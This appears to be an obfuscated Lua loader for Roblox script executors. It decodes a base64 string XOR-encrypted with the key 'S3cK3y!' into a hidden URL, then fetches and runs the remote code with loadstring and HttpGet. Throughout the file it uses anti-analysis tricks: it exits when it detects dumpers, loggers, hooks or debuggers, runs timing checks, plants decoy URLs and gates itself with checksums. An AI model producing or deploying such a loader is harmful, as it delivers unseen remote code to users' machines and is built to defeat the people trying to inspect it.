local a = getfenv and getfenv(0) or _G

local _os = a[string.char(111, 115)]
local _clock = _os and _os[string.char(99, 108, 111, 99, 107)]
local _startTime = _clock and _clock() or 0

local b = a[string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
local c = a[string.char(103, 97, 109, 101)]
local d = c and c[string.char(72, 116, 116, 112, 71, 101, 116)]
local e = a[string.char(115, 116, 114, 105, 110, 103)]
        and a[string.char(115, 116, 114, 105, 110, 103)][string.char(99, 104, 97, 114)]

local f = type(b) == 'function'
      and type(d) == 'function'
      and type(e) == 'function'
      and e(('\97'):rep(1)) == 97
if not f then return end

local g = debug and debug.getregistry and debug.getregistry() or {}
if g[string.char(82, 111, 98, 108, 111, 120, 85, 73)]
or g[string.char(95, 95, 100, 101, 98, 117, 103, 95, 95)]
then return end

local h = a[string.char(115, 101, 116, 99, 108, 105, 112, 98, 111, 97, 114, 100)]
local i = a[string.char(119, 114, 105, 116, 101, 102, 105, 108, 101)]
local j = a[string.char(114, 101, 97, 100, 102, 105, 108, 101)]
local k = a[string.char(114, 101, 113, 117, 101, 115, 116)]
local l = a[string.char(104, 116, 116, 112, 95, 114, 101, 113, 117, 101, 115, 116)]
if h or i or j or k or l then return end

if identifyexecutor then
    local m = identifyexecutor()
    if m:find('Script') or m:find('Webhook') or m:find('Log')
    or m:find('Hook') or m:find('Dump') or m:find('Capture')
    then return end
end

local _dbg = a[string.char(100, 101, 98, 117, 103)]
local _ginfo = _dbg and _dbg[string.char(103, 101, 116, 105, 110, 102, 111)]
if _ginfo and _ginfo(3) then return end

local _shared = a[string.char(115, 104, 97, 114, 101, 100)]
local _suspicious = {
    string.char(108, 111, 103, 103, 101, 114),
    string.char(119, 101, 98, 104, 111, 111, 107),
    string.char(99, 97, 112, 116, 117, 114, 101),
    string.char(100, 117, 109, 112),
    string.char(104, 111, 111, 107),
}
for _, _key in ipairs(_suspicious) do
    if a[_key] or (_shared and _shared[_key]) then return end
end

if 1 == 0 then
    local _fake1 = a[string.char(104, 116, 116, 112, 115, 58, 47, 47)]
             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
             .. string.char(47, 102, 97, 107, 101, 49)
    local _fake2 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
             .. string.char(47, 102, 97, 107, 101, 50)
    if _fake1 == _fake2 then b(d(c, _fake1))() end
    _fake1 = nil
    _fake2 = nil
end

local _decoy1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
             .. string.char(47, 102, 97, 107, 101, 49)
local _decoy2 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
             .. string.char(47, 102, 97, 107, 101, 50)
local _decoy3 = string.char(104, 116, 116, 112, 58, 47, 47)
             .. string.char(116, 101, 115, 116, 46, 108, 111, 99, 97, 108)
             .. string.char(47, 110, 111, 116, 104, 105, 110, 103)
local _dc1, _dc2, _dc3 = 0, 0, 0
for _x = 1, #_decoy1 do _dc1 = (_dc1 * 17 + string.byte(_decoy1, _x)) % 0xFFFFFF end
for _x = 1, #_decoy2 do _dc2 = (_dc2 * 17 + string.byte(_decoy2, _x)) % 0xFFFFFF end
for _x = 1, #_decoy3 do _dc3 = (_dc3 * 17 + string.byte(_decoy3, _x)) % 0xFFFFFF end
if _dc1 ~= 11264929 or _dc2 ~= 11264930 or _dc3 ~= 13661439 then return end
_decoy1, _decoy2, _decoy3 = nil, nil, nil
_dc1, _dc2, _dc3 = nil, nil, nil

local n = 'O0cXO0BDDnxDAjhHHEcqHQI7Q1ZqAVE3A1lOZXxBAjw='

local _fp = n .. '|' .. 'S3cK3y!' .. '|'
      .. string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) .. '|'
      .. string.char(112, 99, 97, 108, 108) .. '|'
      .. string.char(72, 116, 116, 112, 71, 101, 116) .. '|'
      .. tostring(#n)
local _fpcs = 0
for _x = 1, #_fp do _fpcs = (_fpcs * 31 + string.byte(_fp, _x)) % 0xFFFFFFF end
if _fpcs ~= 103549986 then return end
_fp, _fpcs = nil, nil

local o = 0
for p = 1, #n do o = (o * 31 + string.byte(n, p)) % 0xFFFFFFF end
if o ~= 227513087 then return end

local q = function(r)
    local s = {
        A=0,B=1,C=2,D=3,E=4,F=5,G=6,H=7,I=8,J=9,K=10,L=11,M=12,
        N=13,O=14,P=15,Q=16,R=17,S=18,T=19,U=20,V=21,W=22,X=23,Y=24,Z=25,
        a=26,b=27,c=28,d=29,e=30,f=31,g=32,h=33,i=34,j=35,k=36,l=37,m=38,
        n=39,o=40,p=41,q=42,r=43,s=44,t=45,u=46,v=47,w=48,x=49,y=50,z=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,
        ['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,['=']=64
    }
    local t = ''
    local u = 1
    while u <= #r do
        local v = s[string.sub(r, u, u)] or 64
        local w = s[string.sub(r, u+1, u+1)] or 64
        local x = s[string.sub(r, u+2, u+2)] or 64
        local y = s[string.sub(r, u+3, u+3)] or 64
        u = u + 4
        if v ~= 64 and w ~= 64 then
            t = t .. string.char(bit32.bor(bit32.lshift(v, 2), bit32.rshift(w, 4)))
        end
        if w ~= 64 and x ~= 64 then
            t = t .. string.char(bit32.bor(bit32.lshift(bit32.band(w, 15), 4), bit32.rshift(x, 2)))
        end
        if x ~= 64 and y ~= 64 then
            t = t .. string.char(bit32.bor(bit32.lshift(bit32.band(x, 3), 6), y))
        end
    end
    return t
end

local r = q(n)

local s = function(t, u)
    local v = ''
    for w = 1, #t do
        v = v .. string.char(bit32.bxor(
            string.byte(t, w),
            string.byte(u, ((w - 1) % #u) + 1)
        ))
    end
    return v
end

local t = s(r, 'S3cK3y!')

local u = 0
for v = 1, #t do u = (u * 31 + string.byte(t, v)) % 0xFFFFFFF end
if u ~= 91232190 then return end

if _clock then
    local _delta = _clock() - _startTime
    if _delta > 0.1 then return end
end
_startTime = nil

local _math = a[string.char(109, 97, 116, 104)]
local _rand = _math and _math[string.char(114, 97, 110, 100, 111, 109)]
local _task = a[string.char(116, 97, 115, 107)]
local _wait = _task and _task[string.char(119, 97, 105, 116)] or a[string.char(119, 97, 105, 116)]
if _wait and _rand then _wait(_rand() * 0.05) end

local _pcall = a[string.char(112, 99, 97, 108, 108)]
local _func = b
local _arg1 = d
local _arg2 = c
local _arg3 = t

local v = _pcall(function()
    _func(_arg1(_arg2, _arg3))()
end)

t = nil
r = nil
n = nil
_func = nil
_arg1 = nil
_arg2 = nil
_arg3 = nil
_pcall = nil
